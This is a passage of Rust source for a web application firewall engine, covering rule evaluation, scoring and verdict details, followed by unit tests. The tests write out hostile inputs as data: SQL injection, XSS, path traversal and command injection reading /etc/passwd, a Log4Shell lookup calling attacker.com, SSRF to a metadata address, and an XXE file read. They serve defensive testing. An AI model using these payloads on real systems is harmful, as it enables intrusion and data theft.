            // value. A container with interpreter-facing shape is treated as
            // a critical hit; Normal only scores template openers.
            if self.level.is_strict() {
                let expr_monitored = self.hit_monitored(
                    AttackCategory::TemplateInjection,
                    StackSet::GENERIC,
                );
                if let Some(container) = detect_expr_injection(needle) {
                    self.scorer.add_expr_hit_ex(&mut breakdown, expr_monitored);
                    if !expr_monitored {
                        critical_hit = true;
                    }
                    recs.push(HitRec::Expr {
                        container,
                        source: value.source.as_str(),
                        name: &value.name,
                        monitored: expr_monitored,
                    });
                    surfaces.push(Surface::of(value.source));
                } else if detect_js_call(needle)
                    && (value.field || value.source != ValueSource::Body)
                {
                    // A bracket-call in a real member field or on a
                    // URL-facing surface is structural attack material and
                    // scores into the RCE gate. The same shape inside an
                    // unstructured body blob (collected page text, log
                    // dumps) is prose — skipped entirely, like the
                    // search-phrase rule, or the RCE sub-score alone would
                    // re-block what the critical gate let through.
                    self.scorer.add_expr_hit_ex(&mut breakdown, expr_monitored);
                    if !expr_monitored {
                        critical_hit = true;
                    }
                    recs.push(HitRec::Expr {
                        container: "js-call",
                        source: value.source.as_str(),
                        name: &value.name,
                        monitored: expr_monitored,
                    });
                    surfaces.push(Surface::of(value.source));
                }
            }
        }

        // Also scan the normalized path itself — traversal patterns commonly
        // appear after `..` resolution rather than in raw query params.
        self.signatures
            .scan_into(&normalized.path, &mut hits, &mut seen);
        for hit in &hits {
            // Mirror of the decoded-value search-phrase gate: the path is a
            // reflected surface, so a compact or attribute `<script>` tag is
            // real attack material, while prose quoting the word
            // (`…binary<script is incorrect` as a URL slug) must not
            // one-shot through the sev-5 fast path. The gate also skips the
            // score: the family sub-score alone would re-block through
            // PINGWAF-1003 what the critical gate let through.
            let pid = self.signatures.pattern_id(hit.pattern);
            let search_phrase = pid == "XSS-001"
                && !xss_script_tag_shaped(&normalized.path, true);
            if search_phrase {
                continue;
            }
            let critical = (hit.severity >= 5)
                || (self.level.is_strict()
                    && hit.category == AttackCategory::CrlfInjection);
            let monitored = self.hit_monitored(
                hit.category,
                self.signatures.pattern(hit.pattern).stack,
            );
            if critical && !monitored {
                critical_hit = true;
            }
            // Mirror of the decoded-value gate: CI/Deser shapes found on the
            // resolved path keep their aggregate score but stay out of the
            // RCE sub-score.
            if matches!(
                hit.category,
                AttackCategory::CommandInjection
                    | AttackCategory::Deserialization
            ) {
                self.scorer.add_severity_hit_ex(
                    &mut breakdown,
                    hit.severity,
                    monitored,
                );
            } else {
                self.scorer.add_category_hit_ex(
                    &mut breakdown,
                    hit.category,
                    hit.severity,
                    monitored,
                );
            }
            recs.push(HitRec::Sig {
                pattern: hit.pattern,
                severity: hit.severity,
                source: "path",
                name: "",
                monitored,
            });
            surfaces.push(Surface::Path);
        }

        // ----- Build evaluation context (snapshot of Stage-1 scores) -----
        let parsed_ip = IpAddr::from_str(&request.client_ip).ok();
        let ssl = request.scheme.eq_ignore_ascii_case("https");
        let ctx = EvalContext {
            method: &normalized.method,
            path: &normalized.path,
            full_uri: &normalized.full_uri,
            host: normalized.host(),
            user_agent: normalized.user_agent(),
            body: normalized.body_str(),
            headers: normalized.headers,
            cookies: &normalized.cookies,
            client_ip: &request.client_ip,
            parsed_ip,
            country_code: request.country_code.as_deref(),
            ssl,
            waf_score: breakdown.total,
            waf_score_sqli: breakdown.sqli_score,
            waf_score_xss: breakdown.xss_score,
            waf_score_rce: breakdown.rce_score,
        };
        // Managed rules evaluate against the blocking-only snapshot: hits
        // downgraded to monitor-only can never push a family or aggregate
        // gate. The full snapshot stays available to custom rules (explicit
        // operator configuration) and the Allow pre-pass (allowlists must
        // not be blinded by monitor config).
        let block_ctx = EvalContext {
            waf_score: breakdown.block_total,
            waf_score_sqli: breakdown.block_sqli_score,
            waf_score_xss: breakdown.block_xss_score,
            waf_score_rce: breakdown.block_rce_score,
            ..ctx
        };

        // ----- Allow pre-pass -----
        // Allow rules are allowlist entries: they must win over both the
        // Stage-1 fast path and every other rule, otherwise an operator
        // could not exempt a health-check endpoint or an internal network.
        for rule in &self.rules {
            if !rule.enabled || rule.action != RuleAction::Allow {
                continue;
            }
            if rule.paranoia_level > paranoia
                || !self.stacks.contains(rule.stacks)
            {
                continue;
            }
            if !evaluate(&rule.expression, &ctx) {
                continue;
            }
            let mut matched = self.matched_from(&recs, &[]);
            matched.push(rule.id.clone());
            return WafVerdict {
                action: WafAction::Pass,
                score: breakdown.total_u8(),
                matched_rules: matched,
                details: format!(
                    "allow-rule matched: {} [{}]{}",
                    rule.id,
                    rule.name,
                    surfaces_marker(&surfaces)
                        .map_or_else(String::new, |marker| format!(
                            " {marker}"
                        )),
                ),
                breakdown,
            };
        }

        record_method(
            Method::WafSignature,
            stage1_started.elapsed().as_nanos() as u64,
        );

        // ----- Fast-path Block on critical Stage-1 hit -----
        if self.fast_path_block_on_critical && critical_hit {
            return self.finalize_verdict(
                &mut breakdown,
                self.matched_from(&recs, &[]),
                self.details_from(&recs, &[]),
                Some(WafAction::Block),
                "stage1-critical",
                &surfaces,
            );
        }

        // ----- Stage 2: rule engine (non-Allow rules) -----
        let stage2_started = Instant::now();
        let mut rule_recs: Vec<RuleRec> = Vec::new();
        let mut forced_action: Option<WafAction> = None;
        for rule in &self.rules {
            if !rule.enabled || rule.action == RuleAction::Allow {
                continue;
            }
            if rule.paranoia_level > paranoia
                || !self.stacks.contains(rule.stacks)
            {
                continue;
            }
            let is_managed = rule.id.starts_with("PINGWAF-");
            // Managed rules see the blocking-only score snapshot; custom
            // rules see the full aggregate.
            let rule_ctx = if is_managed { &block_ctx } else { &ctx };
            if !evaluate(&rule.expression, rule_ctx) {
                continue;
            }
            let rule_monitored = self.rule_monitored(rule);
            rule_recs.push(RuleRec {
                id: &rule.id,
                name: &rule.name,
                action: rule.action,
                severity: rule.severity,
                monitored: rule_monitored,
            });
            match rule.action {
                RuleAction::Allow => {
                    unreachable!("allow rules handled in pre-pass")
                },
                RuleAction::Log => {
                    // OWASP CRS anomaly-scoring semantics, kept deliberately:
                    // a log-action hit feeds the same aggregate (including
                    // the blocking subset), so several low-severity log hits
                    // — or log hits stacked on signature hits — can cross
                    // the threshold and block. Operators who want a rule to
                    // never contribute to blocking use the per-rule monitor
                    // switch instead, which routes through
                    // `add_severity_hit_ex(monitored=true)`.
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                },
                RuleAction::Block => {
                    self.scorer.add_severity_hit_ex(
                        &mut breakdown,
                        rule.severity,
                        rule_monitored,
                    );
                    if !rule_monitored {
                        forced_action = Some(WafAction::Block);
                    }
                },
                RuleAction::Challenge | RuleAction::JsChallenge => {
                    self.scorer.add_severity_hit_ex(
                        &mut breakdown,
                        rule.severity,
                        rule_monitored,
                    );
                    if !rule_monitored
                        && forced_action != Some(WafAction::Block)
                    {
                        forced_action = Some(WafAction::Challenge);
                    }
                },
            }
        }

        record_method(
            Method::WafExpression,
            stage2_started.elapsed().as_nanos() as u64,
        );

        // ----- Final scoring -----
        breakdown.overall_class = self.scorer.classify(breakdown.block_total);
        let action = if let Some(a) = forced_action {
            a
        } else if self.scorer.should_block(breakdown.block_total) {
            WafAction::Block
        } else if breakdown.total > 0 {
            // Below threshold but something fired — surface it as Monitor so
            // the caller still logs the event. Monitor-only hits keep their
            // aggregate score, so a downgrade surfaces here exactly as an
            // ordinary sub-threshold detection does.
            WafAction::Monitor
        } else {
            WafAction::Pass
        };

        // A clean pass never materializes hit strings — zero formatting
        // cost on the happy path. `Pass` can only be reached when nothing
        // fired anywhere (any hit or Log rule would have raised the score).
        if action == WafAction::Pass {
            debug_assert!(recs.is_empty() && rule_recs.is_empty());
            return WafVerdict::pass();
        }

        let reason = match breakdown.overall_class {
            ScoreClass::Clean => "clean",
            ScoreClass::LikelyClean => "likely-clean",
            ScoreClass::LikelyAttack => "likely-attack",
            ScoreClass::Attack => "attack",
        };
        self.finalize_verdict(
            &mut breakdown,
            self.matched_from(&recs, &rule_recs),
            self.details_from(&recs, &rule_recs),
            Some(action),
            reason,
            &surfaces,
        )
    }

    /// Rule identifiers for every recorded hit, in first-seen order.
    fn matched_from(
        &self,
        recs: &[HitRec<'_>],
        rules: &[RuleRec<'_>],
    ) -> Vec<String> {
        let mut matched = Vec::with_capacity(recs.len() + rules.len());
        for rec in recs {
            match rec {
                HitRec::Sig { pattern, .. } => matched
                    .push(self.signatures.pattern_id(*pattern).to_string()),
                HitRec::Lib { kind, .. } => matched.push(kind.to_string()),
                HitRec::Expr { .. } => matched.push("EXPR-INJ".to_string()),
            }
        }
        for rule in rules {
            matched.push(rule.id.to_string());
        }
        matched
    }

    /// Human-readable explanation for every recorded hit.
    fn details_from(
        &self,
        recs: &[HitRec<'_>],
        rules: &[RuleRec<'_>],
    ) -> Vec<String> {
        let mut details = Vec::with_capacity(recs.len() + rules.len());
        for rec in recs {
            let monitored_suffix = match rec {
                HitRec::Sig { monitored, .. }
                | HitRec::Lib { monitored, .. }
                | HitRec::Expr { monitored, .. } => {
                    if *monitored {
                        " [monitored]"
                    } else {
                        ""
                    }
                },
            };
            match rec {
                HitRec::Sig {
                    pattern,
                    severity,
                    source,
                    name,
                    ..
                } => {
                    let p = self.signatures.pattern(*pattern);
                    details.push(format!(
                        "{} [{} sev={}] in {} '{}'{}",
                        p.id,
                        p.category,
                        severity,
                        source,
                        name,
                        monitored_suffix
                    ));
                },
                HitRec::Lib {
                    kind,
                    fingerprint,
                    source,
                    name,
                    ..
                } => {
                    details.push(format!(
                        "{} [{}] in {} '{}'{}",
                        kind, fingerprint, source, name, monitored_suffix
                    ));
                },
                HitRec::Expr {
                    container,
                    source,
                    name,
                    ..
                } => {
                    details.push(format!(
                        "expr-injection [{}] in {} '{}'{}",
                        container, source, name, monitored_suffix
                    ));
                },
            }
        }
        for rule in rules {
            let suffix = if rule.monitored { " [monitored]" } else { "" };
            // `rule_action` is the action the rule was *configured* with — it
            // stays `block` even when the site mode (or the per-rule monitor
            // switch) suppressed enforcement. Naming it here instead of a bare
            // `action` keeps the original rule action in the event payload.
            details.push(format!(
                "{} [{}] rule_action={} sev={}{}",
                rule.id,
                rule.name,
                rule.action.as_str(),
                rule.severity,
                suffix
            ));
        }
        details
    }

    fn finalize_verdict(
        &self,
        breakdown: &mut ScoreBreakdown,
        matched: Vec<String>,
        details: Vec<String>,
        action: Option<WafAction>,
        reason: &str,
        surfaces: &[Surface],
    ) -> WafVerdict {
        breakdown.overall_class = self.scorer.classify(breakdown.block_total);
        let requested = action.unwrap_or(WafAction::Pass);
        let mut action = requested;
        // Site-wide observe-only mode: the verdict becomes `Monitor` and the
        // request goes through. That part is the documented semantics — what
        // must not happen is the *downgrade disappearing*: an event that only
        // says `action: monitor` is indistinguishable from a rule configured to
        // log, so an operator reading the dashboard concludes the block rule is
        // broken. The event struct has no dedicated field, so the marker rides
        // in `details` (the field the data plane ships as `waf_details`).
        let downgraded = if self.mode == WafMode::Monitor
            && matches!(requested, WafAction::Block | WafAction::Challenge)
        {
            action = WafAction::Monitor;
            Some(enforce_action_str(requested))
        } else {
            None
        };
        // De-dup matched ids while preserving first-seen order.
        let mut seen: Vec<String> = Vec::with_capacity(matched.len());
        for id in matched {
            if !seen.contains(&id) {
                seen.push(id);
            }
        }
        let mut detail_str = if details.is_empty() {
            reason.to_string()
        } else {
            format!("{}: {}", reason, details.join("; "))
        };
        // Where the request was hit (D17): `surface=` names the first hit
        // surface in reading order and `surfaces=` lists every distinct one,
        // so an event is no longer a single blob of mixed body/query/header
        // hits. Emitted before the downgrade phrase (which stays the trailing,
        // documented marker) and omitted when nothing was recorded — so every
        // existing detail shape keeps its documented parts. The values are
        // fixed vocabulary words, never request content or rule internals, so
        // the marker cannot leak data or rule details.
        if let Some(first) = first_surface(surfaces) {
            detail_str.push_str(&format!("; surface={}", first.as_str()));
        }
        if let Some(marker) = surfaces_marker(surfaces) {
            let names = marker.trim_start_matches('[').trim_end_matches(']');
            detail_str.push_str(&format!("; surfaces={names}"));
        }
        if let Some(enforced) = downgraded {
            detail_str.push_str(&format!(
                "; downgraded=true would_enforce={enforced} \
                 cause=site-mode-monitor"
            ));
        }
        WafVerdict {
            action,
            score: breakdown.total_u8(),
            matched_rules: seen,
            details: detail_str,
            breakdown: *breakdown,
        }
    }

    /// Expose the normalized view of a request — handy for tests and for
    /// upstream code that wants to log what the WAF actually saw.
    pub fn normalize<'a>(
        &self,
        request: &'a RequestData,
    ) -> NormalizedRequest<'a> {
        normalize_request(
            &request.method,
            &request.path,
            &request.query,
            &request.headers,
            request.body.as_deref(),
            self.max_decode_layers,
            self.level.is_strict(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> WafEngine {
        WafEngine::new(&WafEngineConfig::default())
    }

    fn req(method: &str, path: &str, query: &str) -> RequestData {
        RequestData {
            method: method.into(),
            path: path.into(),
            query: query.into(),
            headers: vec![
                ("User-Agent".into(), "Mozilla/5.0".into()),
                ("Host".into(), "example.com".into()),
            ],
            body: None,
            client_ip: "203.0.113.10".into(),
            country_code: Some("US".into()),
            scheme: "https".into(),
            protocol: "HTTP/1.1".into(),
        }
    }

    #[test]
    fn passes_clean_request() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "page=1&limit=20"));
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
        assert_eq!(v.score, 0);
        assert!(v.matched_rules.is_empty());
    }

    #[test]
    fn managed_rules_set_to_off_are_not_evaluated() {
        let mut scanner = req("GET", "/", "");
        scanner
            .headers
            .retain(|(k, _)| !k.eq_ignore_ascii_case("User-Agent"));
        scanner
            .headers
            .push(("User-Agent".into(), "sqlmap/1.7".into()));
        // Without the override the scanner UA blocks through PINGWAF-1010.
        assert_eq!(engine().inspect(&scanner).action, WafAction::Block);

        // With the off override the rule is gone entirely: no verdict, no
        // event, no matched rule.
        let cfg = WafEngineConfig {
            disabled_managed_rules: ["PINGWAF-1010".to_string()]
                .into_iter()
                .collect(),
            ..Default::default()
        };
        let v = WafEngine::new(&cfg).inspect(&scanner);
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
        assert!(v.matched_rules.is_empty());
        assert_eq!(v.breakdown.total, 0);

        // Other managed rules keep enforcing on the same engine.
        let r = req("GET", "/api/users", "id=1' OR 1=1 --");
        let v = WafEngine::new(&cfg).inspect(&r);
        assert_eq!(v.action, WafAction::Block);
        assert!(!v.matched_rules.is_empty());
    }

    #[test]
    fn managed_off_override_cannot_be_reintroduced_by_update_rules() {
        let mut e = WafEngine::new(&WafEngineConfig {
            disabled_managed_rules: ["PINGWAF-1010".to_string()]
                .into_iter()
                .collect(),
            ..Default::default()
        });
        // A hot rule update must not resurrect the disabled managed rule:
        // the drained managed set no longer contains it and user rules never
        // carry a `PINGWAF-` id.
        e.update_rules(Vec::new());
        let mut scanner = req("GET", "/", "");
        scanner
            .headers
            .retain(|(k, _)| !k.eq_ignore_ascii_case("User-Agent"));
        scanner
            .headers
            .push(("User-Agent".into(), "sqlmap/1.7".into()));
        let v = e.inspect(&scanner);
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
    }

    #[test]
    fn monitored_managed_rule_downgrades_block_to_monitor() {
        let mut r = req("GET", "/", "");
        r.headers
            .retain(|(k, _)| !k.eq_ignore_ascii_case("User-Agent"));
        r.headers.push(("User-Agent".into(), "sqlmap/1.7".into()));
        assert_eq!(engine().inspect(&r).action, WafAction::Block);

        let cfg = WafEngineConfig {
            monitor_managed_rules: ["PINGWAF-1010".to_string()]
                .into_iter()
                .collect(),
            ..Default::default()
        };
        let v = WafEngine::new(&cfg).inspect(&r);
        // Still detected — rule surfaces in matched_rules, the score stays in
        // the aggregate — but nothing lands in the blocking subset.
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.matched_rules.contains(&"PINGWAF-1010".to_string()));
        assert_eq!(v.breakdown.block_total, 0);
        assert!(v.breakdown.total > 0);
        assert!(v.details.contains("[monitored]"));
    }

    #[test]
    fn monitored_score_gate_downgrades_gate_verdict() {
        // With the critical fast path off, this request blocks only through
        // the SQLi family gate (PINGWAF-1002 fires on a sub-score of 60).
        let r = req("GET", "/api/users", "id=1' OR 1=1 --");
        let base = WafEngineConfig {
            fast_path_block_on_critical: false,
            ..Default::default()
        };
        assert_eq!(WafEngine::new(&base).inspect(&r).action, WafAction::Block);

        let cfg = WafEngineConfig {
            fast_path_block_on_critical: false,
            monitor_managed_rules: ["PINGWAF-1002".to_string()]
                .into_iter()
                .collect(),
            ..Default::default()
        };
        let v = WafEngine::new(&cfg).inspect(&r);
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.matched_rules.contains(&"PINGWAF-1002".to_string()));
        assert!(v.breakdown.total > 0);
        assert!(v.details.contains("[monitored]"));
    }

    /// D17: the verdict names the request surface a hit came from instead of
    /// merging query / header / body hits into one undifferentiated blob.
    #[test]
    fn verdict_details_name_the_hit_surface() {
        let e = engine();

        let query = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert!(query.details.contains("surface=query"), "{}", query.details);

        let mut body_req = req("POST", "/api/users", "");
        body_req.body = Some(b"q=<script>alert(1)</script>".to_vec());
        let body = e.inspect(&body_req);
        assert!(body.details.contains("surface=body"), "{}", body.details);

        let mut header_req = req("GET", "/", "");
        header_req
            .headers
            .push(("X-Forwarded-Host".into(), "1' OR 1=1 --".into()));
        let header = e.inspect(&header_req);
        assert!(
            header.details.contains("surface=header"),
            "{}",
            header.details
        );

        let path = e.inspect(&req("GET", "/files/../../etc/passwd", ""));
        assert!(path.details.contains("surface=path"), "{}", path.details);
    }

    /// D17: a request hit on several surfaces aggregates them, so an operator
    /// sees `surfaces=query,body` rather than only the first hit.
    #[test]
    fn several_hit_surfaces_are_aggregated() {
        let e = engine();
        let mut r = req("POST", "/api/users", "id=1' OR 1=1 --");
        r.body = Some(b"q=<script>alert(1)</script>".to_vec());
        let v = e.inspect(&r);
        assert!(v.details.contains("surface=query"), "{}", v.details);
        assert!(v.details.contains("surfaces=query,body"), "{}", v.details);
    }

    /// D17: the marker only ever carries fixed vocabulary words — never rule
    /// internals or request content.
    #[test]
    fn surface_marker_leaks_no_rule_detail() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        for part in v.details.split("; ") {
            if let Some(names) = part.strip_prefix("surfaces=") {
                for name in names.split(',') {
                    assert!(
                        matches!(name, "query" | "header" | "body" | "path"),
                        "unexpected surface name {name}"
                    );
                }
            }
        }
    }

    #[test]
    fn blocks_sqli_in_query() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
        assert!(v.score > 0);
        assert!(!v.matched_rules.is_empty());
    }

    #[test]
    fn blocks_union_select() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/api/users",
            "id=1 UNION SELECT username, password FROM users",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_xss_script() {
        let e = engine();
        let v =
            e.inspect(&req("GET", "/search", "q=<script>alert(1)</script>"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_xss_onerror() {
        let e = engine();
        let v =
            e.inspect(&req("GET", "/search", "q=<img src=x onerror=alert(1)>"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_path_traversal() {
        let e = engine();
        let v = e.inspect(&req("GET", "/files", "p=../../etc/passwd"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_double_encoded_traversal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/files",
            "p=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_command_injection() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api", "cmd=;cat /etc/passwd"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_command_substitution() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api", "cmd=$(whoami)"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_ssrf_metadata() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/proxy",
            "url=http://169.254.169.254/latest/",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn monitor_mode_does_not_block() {
        let cfg = WafEngineConfig {
            mode: WafMode::Monitor,
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.score > 0);
        // The score path asked to block; the site mode downgraded it. The
        // suppression is recorded instead of being silently swallowed, as one
        // trailing, machine-readable phrase (docs/api.md quotes it verbatim).
        assert!(
            v.details.ends_with(
                "downgraded=true would_enforce=block cause=site-mode-monitor"
            ),
            "{}",
            v.details
        );
    }

    #[test]
    fn monitor_mode_keeps_the_rule_action_visible() {
        let custom = CompiledRule::compile(
            "BLOCK-SECRET",
            "block /secret",
            r#"http.request.uri.path starts_with "/secret""#,
            RuleAction::Block,
            5,
            vec!["custom".into()],
        )
        .unwrap();
        let r = req("GET", "/secret/data", "");

        // Monitor semantics are unchanged — the request goes through …
        let monitor = WafEngineConfig {
            mode: WafMode::Monitor,
            rules: vec![custom.clone()],
            ..Default::default()
        };
        let v = WafEngine::new(&monitor).inspect(&r);
        assert_eq!(v.action, WafAction::Monitor);
        // … while the event says a block rule was suppressed by the site mode,
        // and keeps the action the rule was configured with.
        assert!(v.details.contains("rule_action=block"), "{}", v.details);
        assert!(v.details.contains("downgraded=true"), "{}", v.details);
        assert!(v.details.contains("would_enforce=block"), "{}", v.details);
        assert!(
            v.details.contains("cause=site-mode-monitor"),
            "{}",
            v.details
        );

        // Block mode enforces and has nothing to downgrade.
        let blocking = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let v = WafEngine::new(&blocking).inspect(&r);
        assert_eq!(v.action, WafAction::Block);
        assert!(v.details.contains("rule_action=block"), "{}", v.details);
        assert!(!v.details.contains("downgraded=true"), "{}", v.details);
    }

    #[test]
    fn monitor_mode_marks_a_downgraded_challenge() {
        let custom = CompiledRule::compile(
            "CHALLENGE-SECRET",
            "challenge /secret",
            r#"http.request.uri.path starts_with "/secret""#,
            RuleAction::Challenge,
            4,
            vec![],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            mode: WafMode::Monitor,
            rules: vec![custom],
            ..Default::default()
        };
        let v = WafEngine::new(&cfg).inspect(&req("GET", "/secret/data", ""));
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.details.contains("rule_action=challenge"), "{}", v.details);
        assert!(
            v.details.contains("would_enforce=challenge"),
            "{}",
            v.details
        );
    }

    #[test]
    fn off_mode_skips_everything() {
        let cfg = WafEngineConfig {
            mode: WafMode::Off,
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Pass);
        assert_eq!(v.score, 0);
    }

    #[test]
    fn allow_rule_short_circuits() {
        let custom = CompiledRule::compile(
            "ALLOW-HEALTH",
            "allow health checks",
            r#"http.request.uri.path eq "/healthz""#,
            RuleAction::Allow,
            1,
            vec!["allow".into()],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/healthz", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Pass);
    }

    #[test]
    fn block_rule_on_path() {
        let custom = CompiledRule::compile(
            "BLOCK-SECRET",
            "block /secret",
            r#"http.request.uri.path starts_with "/secret""#,
            RuleAction::Block,
            5,
            vec!["custom".into()],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/secret/data", ""));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
        assert!(v.matched_rules.contains(&"BLOCK-SECRET".to_string()));
    }

    #[test]
    fn custom_rule_monitor_mode_downgrades_block() {
        let custom = CompiledRule::compile(
            "BLOCK-SECRET",
            "block /secret",
            r#"http.request.uri.path starts_with "/secret""#,
            RuleAction::Block,
            5,
            vec!["custom".into()],
        )
        .unwrap();

        // Without the per-rule monitor switch the custom rule enforces.
        let cfg = WafEngineConfig {
            rules: vec![custom.clone()],
            ..Default::default()
        };
        let v = WafEngine::new(&cfg).inspect(&req("GET", "/secret/data", ""));
        assert_eq!(v.action, WafAction::Block);

        // With the monitor switch the hit is still detected and scored, but
        // the rule's own action never enforces.
        let cfg = WafEngineConfig {
            rules: vec![custom],
            monitor_custom_rules: ["BLOCK-SECRET".to_string()]
                .into_iter()
                .collect(),
            ..Default::default()
        };
        let v = WafEngine::new(&cfg).inspect(&req("GET", "/secret/data", ""));
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.matched_rules.contains(&"BLOCK-SECRET".to_string()));
        assert!(v.details.contains("[monitored]"));
        assert!(v.breakdown.total > 0);
    }

    #[test]
    fn cidr_rule_matches_internal_ip() {
        let custom = CompiledRule::compile(
            "ALLOW-INTERNAL",
            "allow internal",
            "ip.src in {10.0.0.0/8}",
            RuleAction::Allow,
            1,
            vec![],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let mut r = req("GET", "/api", "id=1' OR 1=1 --");
        r.client_ip = "10.1.2.3".into();
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Pass);
    }

    #[test]
    fn body_payload_detected() {
        let e = engine();
        let mut r = req("POST", "/api/comment", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(b"comment=<script>alert(1)</script>&author=bob".to_vec());
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn hot_reload_rules() {
        let mut e = engine();
        let initial = e.rule_count();
        let custom = CompiledRule::compile(
            "CUSTOM-1",
            "custom",
            r#"http.host eq "blocked.com""#,
            RuleAction::Block,
            4,
            vec![],
        )
        .unwrap();
        e.update_rules(vec![custom]);
        // Managed rules preserved, plus one custom.
        assert_eq!(e.rule_count(), initial + 1);
    }

    #[test]
    fn log4shell_in_user_agent_blocked() {
        let e = engine();
        let mut r = req("GET", "/", "");
        r.headers.push((
            "User-Agent".into(),
            "${jndi:ldap://attacker.com/x}".into(),
        ));
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn xxe_in_body_blocked() {
        let e = engine();
        let mut r = req("POST", "/api/xml", "");
        r.body = Some(
            br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn verdict_breakdown_populated() {
        let e = engine();
        let v =
            e.inspect(&req("GET", "/api/users", "id=1' UNION SELECT 1,2,3 --"));
        assert!(v.breakdown.total > 0);
        assert!(v.breakdown.sqli_score > 0);
        assert!(!matches!(v.breakdown.overall_class, ScoreClass::Clean));
    }

    fn strict_engine() -> WafEngine {
        WafEngine::new(&WafEngineConfig {
            level: WafLevel::Strict,
            ..Default::default()
        })
    }

    #[test]
    fn category_and_stack_monitor_set_helpers() {
        // CategorySet: unknown names ignored, empty default = enforce all.
        let set = CategorySet::from_names(["sqli", "nonsense", "xss"]);
        assert!(set.contains_category(AttackCategory::SqlInjection));
        assert!(set.contains_category(AttackCategory::Xss));
        assert!(!set.contains_category(AttackCategory::CommandInjection));
        assert!(CategorySet::default().is_empty());

        // StackSet::from_names_exact does NOT force GENERIC (unlike
        // from_names), so an empty monitor set means "nothing downgraded".
        let java = StackSet::from_names_exact(["java"]);
        assert!(java.contains(StackSet::JAVA));
        assert!(!java.contains(StackSet::GENERIC));
        assert!(StackSet::from_names(["java"]).contains(StackSet::GENERIC));
        assert!(StackSet::GENERIC.except_generic().is_empty());
        assert!(java.except_generic().intersects(StackSet::JAVA));
        assert!(StackSet::EMPTY.is_empty());
    }

    #[test]
    fn monitored_category_downgrades_block_to_monitor() {
        // Path-segment tautology is a critical SQLi shape that blocks by
        // default via the Stage-1 fast path.
        let r = req("GET", "/a/1' or ''='/b", "");
        assert_eq!(engine().inspect(&r).action, WafAction::Block);

        // With sqli monitored the same request is still detected —
        // aggregate score, [monitored] details — but only Monitor.
        let cfg = WafEngineConfig {
            monitor_categories: CategorySet::from_names(["sqli"]),
            ..WafEngineConfig::default()
        };
        let v = WafEngine::new(&cfg).inspect(&r);
        assert_eq!(v.action, WafAction::Monitor);
        assert_eq!(v.breakdown.block_total, 0);
        assert!(v.breakdown.total > 0);
        assert!(v.details.contains("[monitored]"));
    }

    #[test]
    fn monitored_category_keeps_other_families_blocking() {
        // RCE shapes stay blocking while sqli is downgraded.
        let cfg = WafEngineConfig {
            monitor_categories: CategorySet::from_names(["sqli"]),
            ..WafEngineConfig::default()
        };
        let m = WafEngine::new(&cfg);
        let v = m.inspect(&req("GET", "/ax--exec=`id`--remote", ""));
        assert_eq!(v.action, WafAction::Block);
    }

    #[test]
    fn monitored_stack_downgrades_scoped_hits_only() {
        let cfg = WafEngineConfig {
            monitor_stacks: StackSet::from_names_exact(["java"]),
            ..WafEngineConfig::default()
        };
        let m = WafEngine::new(&cfg);
